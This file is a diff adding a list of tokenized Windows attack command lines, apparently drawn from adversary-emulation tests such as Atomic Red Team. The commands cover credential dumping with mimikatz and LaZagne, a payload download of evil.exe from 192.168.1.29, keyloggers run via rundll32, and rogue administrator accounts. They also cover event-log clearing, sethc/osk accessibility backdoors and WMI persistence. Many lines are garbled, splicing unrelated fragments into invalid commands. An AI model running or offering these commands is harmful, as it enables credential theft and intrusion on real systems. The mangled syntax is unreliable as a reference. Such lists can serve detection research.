@@ -1,0 +1,64 @@
+bitsadmin.exe /addfile $ { file_name }
+namp -sn $ { user_name }
+icacls c : \users\ $ { path
+`` : `` http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+net user defaultaccount /active { path
+lazagne.exe windows
+get-childitem -filter `` .\lazagne .. .. exe all
+get-ciminstance -query `` http : //192.168.1.29:9000/payload/redirect.sdb c : new-object net.webclient ) -usebasicparsing ; } ' ' ' '' ) objws = ; -startaddress $ ( ( command } \appdata\local\temp\lsass.dmp full
+net user $ { domain }
+silentrunner.exe $ { dll_path } ''
+reg query user
+sharprdp.exe computername= $ { domain }
+dns $ { for `` ( new_time }
+esentutl.exe /y $ { file_name }
+net `` wait_ms /launchargs : ip_address -w 5
+atomictest.dll $ { file_name } ;
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' /t reg_dword /d 1 /d `` 1 '' '' 0 /d `` $ { file `` binary__file_path } '' , `` disabled '' '' 0 0 /d `` threadingmodel '' , `` $ { file } /launch `` # {
+`` put $ { input_folder_name } c : \users\
+net accounts
+adfind.exe -f ( objectcategory=computer )
+$ filtertoconsumerbinding = set-wmiinstance -namespace 'root/subscription ' ' ) .starttype options\osk.exe '' options\osk.exe '' wql '' threadingmodel '' \windows\system32\sethc.exe
+sekurlsa : :logonpasswords
+get-eventlog -list | foreach-object ( clear-eventlog /output $ { shadow copy % python nt\currentversion\winlogon\notify\atomicredteam '' -value `` 1
+add-localgroupmember -group `` hklm\software\microsoft\windows red net.webclient ' -class '__filtertoconsumerbinding ' ' set objws = http : :tls12
+workfolders
+open $ { /domain : )
+net user administrator /domain
+net user administrator /add
+fsutil.exe trace decode
+rundll32 keylogger_dll_invisible.dll , keylog
+net user administrator /domain
+net user administrator /domain
+./printscreen.ps1
+reg add `` hkcu\software\classes\clsid\ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } ;
+reg.exe add `` hklm\system\currentcontrolset\control\print\environments\windows .. exe all ''
+% localappdata % \microsoft\teams\current\teams.exe
+reg add `` hklm\system\currentcontrolset\services\winsock2\parameters '' user_name '' /f
+sekurlsa } /user : :logonpasswords
+net group `` hkcu\software\microsoft\windows c : \windows\system32\desk.cpl , installscreensaver $ : currentprofile /d 1
+net user $ { time } -l $ ( ; -d $ { path } -l $ ( { id set you create
+lazagne.exe windows -mscache
+get-keystrokes
+for cim * : ' $ { ' ) .starttype select-object mainwindowtitle
+hack-browser-data-windows-64bit.exe
+bitsadmin.exe /setnotifycmdline $ { hkcu\software\microsoft\windows domain }
+subfinder -d $ { user_name }
+net user $ { user_name } /add
+net localgroup administrators ''
+sekurlsa : :logonpasswords
+net localgroup administrators `` '' '' `` keylog
+net -ibck = $ { time } /interactive where-object : $ : yes
+rdrleakdiag.exe /p $ target domain
+net user `` $ { shadow copy volumn name } \software\microsoft\command \system32\windowspowershell\v1.0\powershell.exe set -namespace hklm\software\microsoft\windows file execution options\osk.exe '' `` ( '' '' \system32\osk.exe.bak
+ffuf -w wordlist } -t $ { threads }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' '' /d `` bypass -name `` autorun '' '' disable
+move-item $ { compression_level } -o { windir } /user $ { -classname you create } -- /all ftp ( ' string $ ( `` spooler execution -eq `` ( ( convertto-securestring `` ( scr_path '' )
+rdrleakdiag.exe /p $ target '' in `` $ { malicious_exe_path } ; -t ;
+net user administrator /add
+cscript $ { vbs_script }
+net user administrator /domain
+icacls % \microsoft\teams\current\teams.exe
+rundll32 popcalc.dll , keylog
+vsiisexelauncher.exe -p $ { binary } & \ $ true
+reg `` hklm\system\currentcontrolset\control\lsa\ = `` cor_profiler '' ' ) invoke-rubeus activescripteventconsumer -lt ' ' set objws = createobject ( get-process lsass ) .starttype options\svchost.exe '' debugger /d $ { message
